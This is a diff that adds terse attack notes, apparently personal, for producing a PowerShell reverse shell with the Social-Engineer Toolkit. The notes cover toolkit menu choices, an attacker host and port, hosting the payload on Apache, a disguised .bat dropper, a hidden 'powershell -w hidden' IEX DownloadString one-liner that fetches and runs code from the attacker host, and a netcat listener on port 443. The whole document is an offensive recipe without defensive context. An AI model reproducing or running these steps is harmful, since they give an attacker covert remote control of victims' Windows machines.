@@ -1,0 +1,12 @@
+(powershell bat)
+#(install apache)
+#setoolkit
+#1 and 9 and 2  (powershell reverse shell)
+#reverse host: 192.168.31.226
+#443
+# cp /root/.set/reports/powershell/powershell.reverse.txt /var/www/html 
+# mv poshell.txt powershellattack.txt
+#touch powershellattack.bat
+#gedit powershellattack.bat   (in windows)
+#powershell -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://192.168.31.226:80/powershellattack.txt')"
+# nc -nvlp 443  (netcat)
